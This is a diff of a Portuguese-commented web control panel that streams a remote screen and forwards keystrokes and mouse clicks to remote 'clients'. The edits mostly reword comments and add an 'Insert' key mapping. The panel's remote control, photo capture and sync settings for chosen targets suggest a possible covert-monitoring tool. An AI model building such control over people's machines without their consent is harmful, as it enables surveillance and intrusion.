@@ -192,7 +192,7 @@
             <img id="live-stream-img" class="w-full h-full object-contain relative z-20 origin-center transition-transform duration-75 pointer-events-none" src="" alt="" draggable="false">
         </div>
 
-        <!-- NEW: MENU DE CONFIGURAÇÃO DE VÍDEO (ESTILO YOUTUBE) -->
+        <!-- MENU DE CONFIGURAÇÃO DE VÍDEO (ESTILO YOUTUBE) -->
         <div class="absolute bottom-4 right-4 sm:bottom-8 sm:right-8 z-[70] flex justify-end">
             <div class="relative">
                 <button onclick="document.getElementById('stream-settings-popup').classList.toggle('hidden')" class="text-gray-400 bg-slate-900/60 backdrop-blur-sm border border-slate-700/50 hover:bg-slate-800 hover:text-white p-2.5 sm:p-3 rounded-full transition-transform hover:rotate-90 shadow-lg active:scale-95" title="Definições de Qualidade">
@@ -329,7 +329,7 @@
                             <span class="text-fuchsia-400 font-semibold text-xs mb-1">Resolução Fotos (%):</span>
                             <input type="number" id="mod_photo_resolution" class="mt-1 w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-fuchsia-400 text-xs">
                         </label>
-                        
+
                         <label class="flex flex-col mt-1 sm:mt-2">
                             <span class="text-xs mb-1 text-gray-400">Intervalo Sync (min):</span>
                             <input type="number" id="mod_sync" class="mt-1 w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-white text-xs">
@@ -759,8 +759,7 @@
                 btn.classList.add('bg-emerald-600');
                 btn.classList.remove('bg-slate-800/80');
                 streamImg.classList.add('cursor-crosshair');
-                // Adiciona o foco automático na janela para permitir capturar as teclas
-                streamContainerInner.focus();
+                streamContainerInner.focus(); // Prepara para receber teclas
                 resetStreamZoom(); 
             } else {
                 btn.classList.remove('bg-emerald-600');
@@ -824,13 +823,13 @@
             } catch(err) {}
         }
 
-        // NOVO: Função que envia a ordem HTTP (Teclado) - MELHORADA
+        // FUNÇÃO DE TECLADO MELHORADA (Mapeia e envia)
         async function sendKeyCommand(action, e) {
             if(!controlMode || !currentStreamUrl) return;
 
             let keyName = e.key;
             
-            // Mapeamento exato para o pynput (Python) reconhecer todas as teclas
+            // Dicionário de mapeamento para o pynput (Python)
             const keyMap = {
                 ' ': 'space', 'Spacebar': 'space',
                 'Control': 'ctrl', 'Alt': 'alt', 'Shift': 'shift',
@@ -840,6 +839,7 @@
                 'ArrowLeft': 'left', 'ArrowRight': 'right',
                 'CapsLock': 'caps_lock', 'Delete': 'delete',
                 'Home': 'home', 'End': 'end', 'PageUp': 'page_up', 'PageDown': 'page_down',
+                'Insert': 'insert',
                 'F1': 'f1', 'F2': 'f2', 'F3': 'f3', 'F4': 'f4', 'F5': 'f5', 'F6': 'f6',
                 'F7': 'f7', 'F8': 'f8', 'F9': 'f9', 'F10': 'f10', 'F11': 'f11', 'F12': 'f12'
             };
@@ -850,7 +850,7 @@
                 keyName = 'space';
             }
 
-            // Evitar enviar strings grandes que o Python não reconhece para não travar
+            // Bloqueia teclas não reconhecidas ou combinadas do navegador
             if (keyName.length > 1 && !Object.values(keyMap).includes(keyName)) {
                 return; 
             }
@@ -866,10 +866,10 @@
             } catch(err) {}
         }
 
-        // Eventos Teclado (Global - blindado para não falhar)
+        // OUVINTES GLOBAIS DE TECLADO
         document.addEventListener('keydown', (e) => {
             if(controlMode && !isRecordingHotkey && !document.getElementById('global-config-modal').classList.contains('flex') && !document.getElementById('config-modal').classList.contains('flex')) {
-                e.preventDefault(); // Bloqueia TUDO (scroll, atalhos do navegador) para garantir envio
+                e.preventDefault(); // Impede scroll e funções nativas do browser
                 sendKeyCommand('keydown', e);
             }
         }, {passive: false});
@@ -886,7 +886,6 @@
         });
         streamContainerInner.addEventListener('mousedown', (e) => {
             if(controlMode) {
-                // Ao clicar, garante que o ecrã tem foco para apanhar teclas
                 streamContainerInner.focus();
                 sendMouseCommand(e.button === 2 ? 'rclick' : 'down', e);
             }
@@ -1160,7 +1159,6 @@
         async function pushRemoteConfig() {
             if(!currentTargetId) return;
             
-            // Garantir que mantemos os valores de vídeo que possam ter sido alterados na live!
             const clientData = window.clientsCache[currentTargetId] || {};
             const existingCfg = clientData.panel_config || {};
 
@@ -1182,7 +1180,6 @@
                 photo_quality: parseInt(document.getElementById('mod_photo_quality').value) || 90,
                 photo_resolution: parseInt(document.getElementById('mod_photo_resolution').value) || 100,
                 
-                // Puxa do cache em vez do HTML (que foi removido)
                 stream_quality: existingCfg.stream_quality || 60,
                 stream_resolution: existingCfg.stream_resolution || 70,
                 
